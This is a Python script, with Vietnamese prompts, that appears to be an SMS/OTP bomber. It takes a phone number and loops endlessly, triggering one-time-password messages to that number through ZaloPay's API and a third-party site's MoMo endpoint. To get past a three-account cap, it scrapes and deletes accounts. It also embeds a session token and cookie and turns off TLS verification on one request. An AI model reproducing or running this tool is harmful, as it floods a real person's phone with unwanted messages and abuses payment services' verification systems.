import os
import requests
from bs4 import BeautifulSoup

def zalopay(phone_number):
    try:
        headers = {
            'Host': 'api.zalopay.vn',
            'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
            'x-device-model': 'iPhone8,2',
            'x-density': 'iphone3x',
            'authorization': 'Bearer ',
            'x-device-os': 'IOS',
            'x-drsite': 'off',
            'accept': '*/*',
            'x-app-version': '7.13.1',
            'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
            'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
            'x-platform': 'NATIVE',
            'x-os-version': '14.6',
        }
        params = {
            'phone_number': phone_number,
        }

        token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
        json_data = {
            'phone_number': phone_number,
            'send_otp_token': token,
        }

        response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
        return True
    except:
        return False

os.system("cls" if os.name == "nt" else "clear")
success_count = 0  # Biến đếm số lần gửi thành công
index = 1  # Biến số thứ tự

while True:
    try:
        sdt = input('  Nhập sđt: ')
        if not sdt.isnumeric() or len(sdt) != 10:
            print("  Số điện thoại không hợp lệ")
            continue

        data = {
            'action': 'GETOTP',
            'sdt': sdt,
            'pass': '000000',
            'token': '879ec74f3106b15264ab53a928e3d574'
        }
        cookies = {
            'token': '879ec74f3106b15264ab53a928e3d574',
            'PHPSESSID': '0d6a4b857c27f411b31026e3642d124f',
        }

        while True:
            response = requests.post('https://mienphi.sieuthicode.net/ajaxs/client/momo.php', data=data).json()

            if response['msg'] == 'Quý dị chỉ được thêm tối đa 3 tài khoản momo':
                response = requests.get('https://mienphi.sieuthicode.net/client/listaccount', cookies=cookies).text
                soup = BeautifulSoup(response, 'html.parser')
                delete_commands = []
                buttons = soup.find_all('button')
               
                for button in buttons:  # Sửa thành 'button' trong vòng lặp
                    onclick = button.get('onclick')
                    if onclick and 'DeleteMomo' in onclick:
                        command = onclick.split('DeleteMomo(')[1].split(')')[0]
                        delete_commands.append(command)
                for id in delete_commands:
                    data = {
                        'atc': 'DELETEMOMO',
                        'id': id,
                        'token': '879ec74f3106b15264ab53a928e3d574',
                    }
                    response = requests.post('https://mienphi.sieuthicode.net/ajaxs/client/actionmomo.php', data=data, verify=False).json()

            elif response['msg'] == 'Thành công!':
                print(f'  Gửi thành công {index} lần')
                success_count += 1  # Tăng biến đếm số lần gửi thành công
                zalopay(sdt)  # Gửi tin nhắn ZaloPay
                index += 1  # Tăng biến số thứ tự

            elif response['msg'] == 'Hết thời gian truy cập. Vui lòng đăng nhập lại!':
                pass

            elif response['msg'] == 'Số điện thoại bạn vừa nhập không hợp lệ. Vui lòng kiểm tra lại!':
                print(response['msg'])
                break

            else:
                print(response)
    except KeyboardInterrupt:
        print("Đã thoát")
        break

print("Số lần gửi thành công:", success_count)
